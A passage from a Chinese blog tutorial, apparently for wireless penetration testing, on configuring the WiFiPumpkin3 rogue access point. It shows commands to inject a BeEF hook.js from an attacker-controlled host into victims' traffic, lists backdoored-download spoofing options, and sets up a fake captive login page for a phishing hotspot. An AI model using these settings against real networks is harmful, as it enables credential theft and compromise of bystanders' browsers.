+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali-rpi)-[~/wifipumpkin3]</span><br><span class="line">└─$ sudo wifipumpkin3 --pulp /home/kali/wifipumpkin3/demo.pulp </span><br><span class="line"></span><br><span class="line">                            .,<span class="string">&#x27;</span></span><br><span class="line"><span class="string">                        .&#x27;</span><span class="string">&#x27;.&#x27;</span></span><br><span class="line">                        .<span class="string">&#x27; .&#x27;</span></span><br><span class="line">            _.ood0Pp._ ,<span class="string">&#x27;  `.~ .q?00doo._</span></span><br><span class="line"><span class="string">        .od00Pd0000Pdb._. . _:db?000b?000bo.</span></span><br><span class="line"><span class="string">     .?000Pd0000Pd0000PdbMb?0000b?000b?0000b.</span></span><br><span class="line"><span class="string">    .d0000Pd0000Pd0000Pd0000b?0000b?000b?0000b.</span></span><br><span class="line"><span class="string">    d0000Pd0000Pd00000Pd0000b?00000b?0000b?000b.</span></span><br><span class="line"><span class="string">    00000Pd0000Pd0000Pd00000b?00000b?0000b?0000b</span></span><br><span class="line"><span class="string">    ?0000b?0000b?  WiFiPumpkin3  00Pd0000Pd0000P</span></span><br><span class="line"><span class="string">    ?0000b?0000b?0000b?00000Pd00000Pd0000Pd000P</span></span><br><span class="line"><span class="string">    `?0000b?0000b?0000b?0000Pd0000Pd0000Pd000P&#x27;</span></span><br><span class="line">     `?000b?0000b?000b?0000Pd000Pd0000Pd000P</span><br><span class="line">        `~?00b?000b?000b?000Pd00Pd000Pd00P<span class="string">&#x27;</span></span><br><span class="line"><span class="string">            `~?0b?0b?000b?0Pd0Pd000PdP~&#x27;</span></span><br><span class="line">                                     codename: Guaraci</span><br><span class="line">by: @mh4x0f - P0cL4bs Team | version: 1.0.9 dev</span><br><span class="line">[*] Session id: 46e8dee6-736d-11ec-b6d8-dca632487d72 </span><br><span class="line"></span><br><span class="line">[*] mode: script</span><br><span class="line"></span><br><span class="line">[*] plugin: /home/kali/wifipumpkin3/demo.pulp <span class="comment"># 加载了</span></span><br><span class="line">=============================================</span><br><span class="line"></span><br><span class="line">Starting prompt...</span><br><span class="line">wp3 &gt; ap</span><br><span class="line"></span><br><span class="line">[*] Settings AccessPoint:</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line"> BSSID             | SSID   |   Channel | Interface   | Status      | Security</span><br><span class="line">-------------------+--------+-----------+-------------+-------------+------------</span><br><span class="line"> BC:F6:85:03:36:5B | zss    |        11 | wlan1       | not Running | <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="命令行方式加载"><a href="#命令行方式加载" class="headerlink" title="命令行方式加载"></a>命令行方式加载</h3><blockquote>
+<p>用到的是<code>--xpulp</code>参数</p>
+</blockquote>
+<p>格式</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wifipumpkin3 --xpulp <span class="string">&quot;set interface wlan1; set ssid zss; set proxy noproxy;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>演示</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo wifipumpkin3 --xpulp <span class="string">&quot;set interface wlan1; set ssid zss; set proxy noproxy;&quot;</span></span><br><span class="line"></span><br><span class="line">                             Jgy__</span><br><span class="line">                            jWW  `<span class="string">&quot;&quot;</span>9Wf</span><br><span class="line">                          _<span class="comment">#WWW     IW</span></span><br><span class="line">                         jWWWWW     IW</span><br><span class="line">                 __,yyyyyWWWWW     IWyyyy___</span><br><span class="line">            _jyWWP<span class="string">&quot;^``&quot;</span>`.C<span class="string">&quot;9*,J _.mqD:^^&quot;</span>WWWWWWQg__</span><br><span class="line">          jgW<span class="string">&quot;^.C/&quot;</span>    .C<span class="string">&#x27;     I    `D.     &#x27;</span>D._<span class="string">&quot;WQg_</span></span><br><span class="line"><span class="string">        jWP` .C&quot;</span>       C<span class="string">&#x27;      I     `D._     `D._ &quot;Qg_</span></span><br><span class="line"><span class="string">      jQP`  .C    ,d^^b._      I      _.d^^b.   `D._ &quot;Qg</span></span><br><span class="line"><span class="string">     jQ^  .C&quot;   /`   .+&quot; \     I     / &quot;+.   `\   `D.  XQ</span></span><br><span class="line"><span class="string">    jQ&#x27;</span>  .C<span class="string">&#x27;   |`  .&quot;    )    _I    (     &quot;.  |    `D.  4#</span></span><br><span class="line"><span class="string">    Qf  .C     (   (    /    / /\    \     )  )     `D.  Qg</span></span><br><span class="line"><span class="string">   jW   C&#x27;</span>      \__\_.+<span class="string">&#x27;    / /  \    `+._/__/       `D  jQ</span></span><br><span class="line"><span class="string">   Qf   C         C        /_/    \         D         D   Qk</span></span><br><span class="line"><span class="string">   Qf   C      _  C        \_\____/         D  _      D   QF</span></span><br><span class="line"><span class="string">   QL   C      \`+.__     _______     ______.+&#x27;</span>/      D   QF</span><br><span class="line">   B&amp;   C.      \   \|    ||     |    ||      /       D   Qf</span><br><span class="line">   jQ   `C.      \   |____|/     |____|/__   /      .D<span class="string">&#x27;   jW</span></span><br><span class="line"><span class="string">    TQ   `C.      \._   `+.__________/___/|_/      .D&#x27;</span>   jQ`</span><br><span class="line">     9Q   `C.      C.`+._           |   |/.D<span class="string">&#x27;     .D&#x27;</span>   jQ<span class="string">&#x27;</span></span><br><span class="line"><span class="string">      &quot;Qg  `C.     `C.   `&quot;+-------&#x27;</span>   <span class="string">&#x27; .D&#x27;</span>     .D<span class="string">&#x27;   pW`</span></span><br><span class="line"><span class="string">       ^WQy `C.     `C.        I        .D&#x27;</span>    _.D<span class="string">&#x27; yW&quot;</span></span><br><span class="line"><span class="string">         ^9Qy_`C.    `C.       I       .D&#x27;</span>   _.D jgW<span class="string">&quot;</span></span><br><span class="line"><span class="string">            `9WQgC.__ `C.      I      .D&#x27;  _.Dp@@&quot;</span>`</span><br><span class="line">           ilmk `<span class="string">&quot;&quot;</span>9WQQggyyyyyygyyyyyQggQWQH<span class="string">&quot;&quot;</span></span><br><span class="line">                                            codename: Guaraci</span><br><span class="line">by: @mh4x0f - P0cL4bs Team | version: 1.0.9 dev</span><br><span class="line">[*] Session id: cebf5d5e-736d-11ec-aaff-dca632487d72 </span><br><span class="line">Starting prompt...</span><br><span class="line">wp3 &gt; ap</span><br><span class="line"></span><br><span class="line">[*] Settings AccessPoint:</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line"> BSSID             | SSID   |   Channel | Interface   | Status      | Security</span><br><span class="line">-------------------+--------+-----------+-------------+-------------+------------</span><br><span class="line"> BC:F6:85:03:36:5B | zss    |        11 | wlan1       | not Running | <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="插件的使用"><a href="#插件的使用" class="headerlink" title="插件的使用"></a>插件的使用</h2><h3 id="启用或禁用插件"><a href="#启用或禁用插件" class="headerlink" title="启用或禁用插件"></a>启用或禁用插件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp3 &gt; <span class="built_in">set</span> plugin plugin_name <span class="literal">true</span>或者<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="自定义页面登录"><a href="#自定义页面登录" class="headerlink" title="自定义页面登录"></a>自定义页面登录</h3><p>他的配置文件在<code>/config/templates/</code></p>
+<h4 id="文件架构¶"><a href="#文件架构¶" class="headerlink" title="文件架构¶"></a>文件架构<a target="_blank" rel="noopener" href="https://wifipumpkin3.github.io/docs/getting-started#file-architecture">¶</a></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">├── preview.png</span><br><span class="line">├── static</span><br><span class="line">│   ├── css</span><br><span class="line">│   │   ├── bootstrap.min.css</span><br><span class="line">│   │   ├── main.css</span><br><span class="line">│   │   ├── styles.css</span><br><span class="line">│   │   └── util.css</span><br><span class="line">│   └── js</span><br><span class="line">│       ├── bootstrap.min.js</span><br><span class="line">│       ├── jquery-1.11.1.min.js</span><br><span class="line">│       └── main.js</span><br><span class="line">└── templates</span><br><span class="line">    ├── login.html</span><br><span class="line">    └── login_successful.html</span><br><span class="line"></span><br><span class="line">4 directories, 9 files</span><br></pre></td></tr></table></figure>
+
+<h2 id="代理插件功能"><a href="#代理插件功能" class="headerlink" title="代理插件功能"></a>代理插件功能</h2><blockquote>
+<p>可以用<code>proxies</code>查看模块</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[*] Available proxies:</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Proxy        | Active   |   Port | Description</span><br><span class="line">--------------+----------+--------+-------------------------------------------------------</span><br><span class="line"> pumpkinproxy | False    |   8080 | Transparent proxies that you can use to intercept ...</span><br><span class="line"> noproxy      | True     |     80 | Runnning without proxy redirect traffic</span><br><span class="line"> captiveflask | False    |     80 | Allow block Internet access <span class="keyword">for</span> users until they o...</span><br></pre></td></tr></table></figure>
+
+<p>可用代理：</p>
+<ul>
+<li><strong>Pumpkinproxy</strong> - 用于拦截 TCP 协议<a target="_blank" rel="noopener" href="https://wifipumpkin3.github.io/docs/getting-started#pumpkinproxy">doc</a>上的网络流量的代理</li>
+<li><strong>captiveflask</strong> - 允许阻止用户访问 Internet，直到他们打开页面登录页面。<a target="_blank" rel="noopener" href="https://wifipumpkin3.github.io/docs/getting-started#captiveflask">文档</a></li>
+<li><strong>noproxy</strong> - 在没有代理重定向流量的情况下运行</li>
+</ul>
+<h3 id="设置代理插件"><a href="#设置代理插件" class="headerlink" title="设置代理插件"></a>设置代理插件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp3 &gt; <span class="built_in">set</span> proxy （模块名Pumpkinproxy或者captiveflask或者noproxy）</span><br></pre></td></tr></table></figure>
+
+<h3 id="启用-禁用插件"><a href="#启用-禁用插件" class="headerlink" title="启用/禁用插件"></a>启用/禁用插件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp3 &gt; <span class="built_in">set</span> proxy 模块名 <span class="literal">true</span>或者<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="pumpkinproxy插件"><a href="#pumpkinproxy插件" class="headerlink" title="pumpkinproxy插件"></a>pumpkinproxy插件</h3><blockquote>
+<p>按tab键</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wp3 &gt; <span class="built_in">set</span> pumpkinproxy.</span><br><span class="line">pumpkinproxy.beef                            pumpkinproxy.downloadspoof.backdoorWORDpath  pumpkinproxy.js_inject.url</span><br><span class="line">pumpkinproxy.beef.url_hook                   pumpkinproxy.downloadspoof.backdoorXLSpath   pumpkinproxy.no-cache</span><br><span class="line">pumpkinproxy.downloadspoof                   pumpkinproxy.html_inject                     pumpkinproxy.replaceImages</span><br><span class="line">pumpkinproxy.downloadspoof.backdoorExePath   pumpkinproxy.html_inject.content_path        pumpkinproxy.replaceImages.path</span><br><span class="line">pumpkinproxy.downloadspoof.backdoorPDFpath   pumpkinproxy.js_inject     </span><br></pre></td></tr></table></figure>
+
+<p>用<code>pumpkinproxy.beef.url_hook</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp3 &gt; <span class="built_in">set</span> pumpkinproxy.beef.url_hook http://172.16.149.141:3000/hook.js</span><br></pre></td></tr></table></figure>
+
+<h3 id="captiveflask强制用户登录"><a href="#captiveflask强制用户登录" class="headerlink" title="captiveflask强制用户登录"></a>captiveflask强制用户登录</h3><blockquote>
+<p>我们此次使用DarkLogin.py</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">设置热点名称</span><br><span class="line"></span><br><span class="line">wp3 &gt; set ssid zss</span><br><span class="line"></span><br><span class="line">选择网卡</span><br><span class="line"></span><br><span class="line">wp3 &gt; set interface wlan0</span><br><span class="line"></span><br><span class="line">设置代理插件</span><br><span class="line"></span><br><span class="line">wp3 &gt; set proxy captiveflask</span><br><span class="line"></span><br><span class="line">设置模板</span><br><span class="line"></span><br><span class="line">wp3 &gt; set captiveflask.DarkLogin true</span><br><span class="line">wp3 &gt; start</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2020/09/09/wifipumpkin3/">http://example.com/2020/09/09/wifipumpkin3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Hexo</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/">无线渗透</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20220112133323774.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/09/09/9.%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%EF%BC%8C-sql%E6%B3%A8%E5%85%A5Dnslog%E7%9B%B2%E6%B3%A8/"><img class="prev-cover" src="https://pic.3gbizhi.com/2020/0627/thumb_1680_0_20200627125736144.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">9. 网易web安全渗透， sql注入Dnslog盲注</div></div></a></div><div class="next-post pull-right"><a href="/2020/09/08/picGo%E5%8A%A0gitee%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA%E5%92%8C%E9%85%8D%E7%BD%AE/"><img class="next-cover" src="https://gitee.com/wZass/zp/raw/master/img/20200821113456895.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">picGo加gitee图床搭建和配置</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%A7%8D%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text">攻击种类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">2.</span> <span class="toc-text">安装</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A6%81%E6%B1%82"><span class="toc-number">2.1.</span> <span class="toc-text">要求</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%EF%BC%88%E9%A2%84%E8%A3%85%EF%BC%89"><span class="toc-number">2.1.1.</span> <span class="toc-text">工具（预装）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-number">2.1.2.</span> <span class="toc-text">操作系统（推荐）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Debian-Ubuntu"><span class="toc-number">2.2.</span> <span class="toc-text">Debian&#x2F;Ubuntu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali-Linux%E5%AE%89%E8%A3%85"><span class="toc-number">2.3.</span> <span class="toc-text">Kali Linux安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%96%E8%80%85%E6%A3%80%E6%9F%A5pyqt5%E6%98%AF%E5%90%A6%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F%EF%BC%9A"><span class="toc-number">2.3.1.</span> <span class="toc-text">或者检查pyqt5是否安装成功：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85wifipumpkin3"><span class="toc-number">2.3.2.</span> <span class="toc-text">安装wifipumpkin3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-wifipumpkin3"><span class="toc-number">2.3.3.</span> <span class="toc-text">运行 wifipumpkin3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text">查看网络设备器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">参数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">4.1.1.</span> <span class="toc-text">基本的命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%91%BD%E4%BB%A4"><span class="toc-number">4.1.2.</span> <span class="toc-text">核心命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E9%92%93%E9%B1%BC%E7%83%AD%E7%82%B9"><span class="toc-number">4.2.</span> <span class="toc-text">搭建简单钓鱼热点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E8%87%AA%E5%B7%B1%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">4.3.</span> <span class="toc-text">加载自己的配置文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.3.1.</span> <span class="toc-text">文件方式加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%B9%E5%BC%8F%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.3.2.</span> <span class="toc-text">命令行方式加载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">4.4.</span> <span class="toc-text">插件的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E7%94%A8%E6%88%96%E7%A6%81%E7%94%A8%E6%8F%92%E4%BB%B6"><span class="toc-number">4.4.1.</span> <span class="toc-text">启用或禁用插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E9%A1%B5%E9%9D%A2%E7%99%BB%E5%BD%95"><span class="toc-number">4.4.2.</span> <span class="toc-text">自定义页面登录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%9E%B6%E6%9E%84%C2%B6"><span class="toc-number">4.4.2.1.</span> <span class="toc-text">文件架构</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E6%8F%92%E4%BB%B6%E5%8A%9F%E8%83%BD"><span class="toc-number">4.5.</span> <span class="toc-text">代理插件功能</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%E6%8F%92%E4%BB%B6"><span class="toc-number">4.5.1.</span> <span class="toc-text">设置代理插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E7%94%A8-%E7%A6%81%E7%94%A8%E6%8F%92%E4%BB%B6"><span class="toc-number">4.5.2.</span> <span class="toc-text">启用&#x2F;禁用插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pumpkinproxy%E6%8F%92%E4%BB%B6"><span class="toc-number">4.5.3.</span> <span class="toc-text">pumpkinproxy插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#captiveflask%E5%BC%BA%E5%88%B6%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95"><span class="toc-number">4.5.4.</span> <span class="toc-text">captiveflask强制用户登录</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By John Doe</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
